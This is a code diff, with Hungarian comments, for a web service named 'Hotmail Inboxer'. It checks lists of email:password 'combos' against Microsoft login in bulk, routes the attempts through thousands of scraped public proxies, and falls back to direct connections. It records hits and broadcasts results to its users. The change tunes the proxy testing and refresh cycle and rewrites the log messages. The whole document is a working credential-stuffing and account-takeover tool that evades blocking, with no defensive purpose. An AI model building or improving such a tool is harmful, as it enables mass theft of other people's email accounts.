@@ -44,35 +44,35 @@ def upload_to_external_api(content: str, filename: str) -> str:
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    print("\n🔧 Startup - Proxy letöltés és tesztelés...")
+    print("\n🔧 Startup...")
 
-    # ====== 1. PROXY LETÖLTÉS ======
+    # 1. PROXY LETÖLTÉS
     await asyncio.to_thread(proxy_manager.fetch_proxies)
 
-    # ====== 2. PROXY TESZTELÉS ======
+    # 2. PROXY TESZTELÉS (Microsoft login ellen!)
     working_count = await asyncio.to_thread(
         proxy_manager.test_and_filter,
-        1500,   # 1500 proxyt tesztelünk
-        300,    # 300 párhuzamos szál
-        4       # 4 másodperc timeout
+        2000,   # 2000 proxyt tesztelünk
+        400,    # 400 párhuzamos szál
+        6       # 6 másodperc timeout
     )
 
     if working_count == 0:
-        print("⚠️  FIGYELEM: Egyetlen proxy sem működik!")
-        print("⚠️  A checker proxy nélkül fog futni!")
+        print("⚠️  Nem találtunk működő proxyt!")
+        print("⚠️  A checker DIRECT módban fog futni (proxy nélkül)!")
     else:
-        print(f"🟢 {working_count} TESZTELT proxy készen áll!")
+        print(f"🟢 {working_count} Microsoft-tesztelt proxy kész!")
 
-    # ====== 3. HÁTTÉRBEN PROXY FRISSÍTÉS (30 percenként) ======
+    # 3. HÁTTÉRBEN PROXY FRISSÍTÉS (45 percenként)
     async def proxy_refresh_loop():
         while True:
-            await asyncio.sleep(1800)
-            print("\n🔄 Proxyk automatikus frissítése és tesztelése...")
+            await asyncio.sleep(2700)  # 45 perc
+            print("\n🔄 Proxyk frissítése és tesztelése...")
             await asyncio.to_thread(proxy_manager.fetch_and_test)
 
     refresh_task = asyncio.create_task(proxy_refresh_loop())
 
-    # ====== 4. DB CLEANUP ======
+    # 4. DB CLEANUP
     from pymongo import MongoClient
     sync_client = MongoClient(os.getenv("MONGODB_URL"))
     db = sync_client.hotmail_checker
@@ -86,14 +86,14 @@ async def lifespan(app: FastAPI):
 
     yield
 
-    print("\n🛑 Shutdown cleanup...")
+    print("\n🛑 Shutdown...")
     refresh_task.cancel()
     with stop_lock:
         for user_id in list(stop_flags.keys()):
             stop_flags[user_id].set()
 
 
-app = FastAPI(title="Hotmail Inboxer (Tested Proxies)", lifespan=lifespan)
+app = FastAPI(title="Hotmail Inboxer (Smart Proxy)", lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -165,7 +165,6 @@ async def proxy_status(current_user=Depends(get_current_user)):
     return {
         "proxy_count": proxy_manager.get_count(),
         "tested": proxy_manager.is_tested(),
-        "status": "active" if proxy_manager.get_count() > 0 else "no_proxies",
     }
 
 
@@ -211,12 +210,15 @@ async def start_checker(
         daemon=True,
     ).start()
 
+    proxy_count = proxy_manager.get_count()
+    mode = f"🔒 {proxy_count} proxy + direct fallback" if proxy_count > 0 else "⚡ Direct mód (proxy nélkül)"
+
     return {
         "run_id": run_id,
         "total": len(lines),
         "speed": speed,
-        "proxies": proxy_manager.get_count(),
-        "tested": proxy_manager.is_tested(),
+        "proxies": proxy_count,
+        "mode": mode,
     }
 
 
@@ -236,10 +238,14 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
     stopped = False
 
     proxy_count = proxy_manager.get_count()
-    tested_str = "✅ tesztelt" if proxy_manager.is_tested() else "⚠️ teszteletlen"
+    if proxy_count > 0:
+        mode_text = f"🔒 {proxy_count} proxy + direct fallback"
+    else:
+        mode_text = "⚡ Direct mód"
+
     broadcast_to_user(user_id, json.dumps({
         "type": "log", "level": "info",
-        "text": f"[START] {total} fiók | {keyword} | {speed}s | 🔒 {proxy_count} proxy ({tested_str})"
+        "text": f"[START] {total} combo | {keyword} | {speed}s | {mode_text}"
     }))
 
     for line in lines:
@@ -285,15 +291,14 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
             bad += 1
             broadcast_to_user(user_id, json.dumps({
                 "type": "log", "level": "bad",
-                "text": f"[BAD] {email} (wrong password)"
+                "text": f"[BAD] {email}"
             }))
 
         else:
-            # error - max retries kimerült
             retries += 1
             broadcast_to_user(user_id, json.dumps({
                 "type": "log", "level": "retry",
-                "text": f"[RETRY FAILED] {email} - {result.get('reason', '?')}"
+                "text": f"[ERROR] {email} - {result.get('reason', '?')}"
             }))
 
         await update_run_stats(run_id, {
@@ -313,7 +318,7 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
     if hits > 0 or custom > 0:
         broadcast_to_user(user_id, json.dumps({
             "type": "log", "level": "info",
-            "text": "⏳ Eredmények feltöltése (Ne zárd be az oldalt)..."
+            "text": "⏳ Eredmények feltöltése..."
         }))
         final_run = await get_run(run_id)
         if final_run:
@@ -334,7 +339,7 @@ async def execute_checker(run_id: str, user_id: str, lines: list, keyword: str, 
     st_text = "LEÁLLÍTVA" if stopped else "KÉSZ"
     broadcast_to_user(user_id, json.dumps({
         "type": "log", "level": "finish",
-        "text": f"[{st_text}] Befejezve! Hits: {hits} | Custom: {custom} | Bad: {bad} | Retries: {retries}"
+        "text": f"[{st_text}] Hits: {hits} | Custom: {custom} | Bad: {bad}"
     }))
     broadcast_to_user(user_id, json.dumps({"type": "finished", "run_id": run_id}))
 
@@ -439,7 +444,7 @@ if __name__ == "__main__":
     import uvicorn
     port = int(os.getenv("PORT", 8000))
     print("\n" + "=" * 60)
-    print("  🚀 Hotmail Inboxer - TESTED PROXY EDITION")
+    print("  🚀 Hotmail Inboxer - SMART PROXY")
     print(f"  📡 http://0.0.0.0:{port}")
     print("=" * 60 + "\n")
     uvicorn.run("main:app", host="0.0.0.0", port=port, reload=False, log_level="info")
